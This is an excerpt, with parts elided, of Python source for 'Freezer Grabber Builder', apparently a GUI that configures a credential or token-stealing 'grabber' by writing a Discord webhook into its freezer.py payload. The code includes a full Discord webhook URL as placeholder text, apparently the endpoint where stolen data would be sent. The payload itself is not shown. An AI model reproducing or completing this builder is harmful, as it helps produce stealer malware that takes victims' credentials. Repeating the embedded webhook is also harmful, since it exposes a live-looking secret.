...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("Freezer Grabber Builder")
        ...
        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Freezer Grabber Builder", image=self.logo_image,
        ...
        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=570, height=35, font=customtkinter.CTkFont(
            size=15, family=self.font), placeholder_text="https://discord.com/api/webhooks/1159167353767067748/tIqROR2BkszuPJHUprmk1MR1QtAG6TSgFz5ZcJbO5tpjvw4fo7fVy43ZNVSJPfQiWaIH")
    ...
    def get_config(self):
        try:
            with open(self.basefilepath + "\\freezer.py", 'r', encoding="utf-8") as f:
                code = f.read()
            ...
            if config_match:
                ...
                raise Exception("Could not find config in freezer.py")
